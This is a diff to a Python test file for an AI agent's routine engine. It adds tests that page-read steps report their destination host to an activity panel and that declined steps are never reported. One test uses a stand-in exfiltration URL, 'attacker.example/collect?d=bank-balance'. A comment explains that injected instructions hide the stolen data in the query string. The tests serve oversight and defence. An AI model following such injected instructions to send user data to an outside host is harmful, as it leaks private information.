@@ -11,6 +11,8 @@ from __future__ import annotations
 
 import pytest
 
+from urllib.parse import urlsplit
+
 from agent_core.memory.store import Store
 from agent_core.permissions.gate import PermissionGate, PermissionStatus
 from agent_core.routines.builder import RoutineBuilder
@@ -158,7 +160,7 @@ class _RaisingTool:
         raise self._exc
 
 
-def _engine(tmp_path, tool=None, gate=None, on_ask_user=None):
+def _engine(tmp_path, tool=None, gate=None, on_ask_user=None, on_activity=None):
     registry = ToolRegistry()
     tool = tool or _FlakyTool()
     registry.register(tool)
@@ -177,6 +179,7 @@ def _engine(tmp_path, tool=None, gate=None, on_ask_user=None):
         undo_manager=undo,
         on_ask_user=on_ask_user,
         store=store,
+        on_activity=on_activity,
     )
     return engine, tool, gate, store
 
@@ -185,6 +188,77 @@ def _routine(steps, variables=()):
     return Routine(
         id="r-1", name="Test", description="", variables=list(variables), steps=steps
     )
+
+
+class _DestinationStep:
+    """A LOW tool that names what it reaches — read_web_page's shape, no network."""
+
+    definition = ToolDefinition(
+        id="destination_step",
+        label="Read a web page",
+        description="A test tool that reaches somewhere.",
+        risk_tier=RiskTier.LOW,
+        parameters_schema={"type": "object", "properties": {"url": {"type": "string"}}},
+    )
+
+    def permission_detail(self, args: dict) -> str | None:
+        return urlsplit(str(args.get("url", ""))).hostname
+
+    def execute(self, args: dict, context) -> ToolResult:
+        return ToolResult(success=True, content="read it")
+
+
+def test_a_routine_step_says_where_it_went_too(tmp_path):
+    """The Activity Panel is the only place a page read's destination is shown, and
+    a routine runs the same tools through the same gate.
+
+    ``read_web_page`` is in the Simple profile's tool set, so a saved routine can
+    contain a page-read step. This path emitted no activity at all, which made the
+    visibility guarantee true of the live turn and false of the routine — i.e.
+    false exactly where nobody is watching the screen. Same (tool_id, label, detail)
+    signature as the orchestrator's, so the panel cannot tell the two apart.
+    """
+    seen: list[tuple] = []
+    engine, _, gate, _ = _engine(
+        tmp_path,
+        tool=_DestinationStep(),
+        on_activity=lambda tool_id, label, detail=None: seen.append((tool_id, label, detail)),
+    )
+    gate.grant("destination_step")
+
+    result = engine.run(
+        _routine([
+            RoutineStep("s1", "destination_step",
+                        {"url": "https://attacker.example/collect?d=bank-balance"}),
+        ]),
+        {},
+    )
+
+    assert result.status == "completed"
+    assert seen == [("destination_step", "Read a web page", "attacker.example")]
+    # Host only, here as in the live loop: the query is where an injected
+    # instruction hides what it wants carried out, and a panel gets screenshotted.
+    assert "bank-balance" not in str(seen)
+
+
+def test_a_declined_routine_step_is_never_announced_as_done(tmp_path):
+    """A denial must not put a line in the work list. The panel is a record of what
+    Addison DID; announcing a step the person just refused would say the opposite."""
+    seen: list[tuple] = []
+    engine, _, _, _ = _engine(
+        tmp_path,
+        tool=_DestinationStep(),
+        gate=PermissionGate(on_request=lambda tool_id: PermissionStatus.DENIED),
+        on_activity=lambda tool_id, label, detail=None: seen.append((tool_id, label, detail)),
+    )
+
+    result = engine.run(
+        _routine([RoutineStep("s1", "destination_step", {"url": "https://example.com/a"})]),
+        {},
+    )
+
+    assert result.status == "failed"
+    assert seen == []
 
 
 def test_on_failure_abort_stops_the_run(tmp_path):
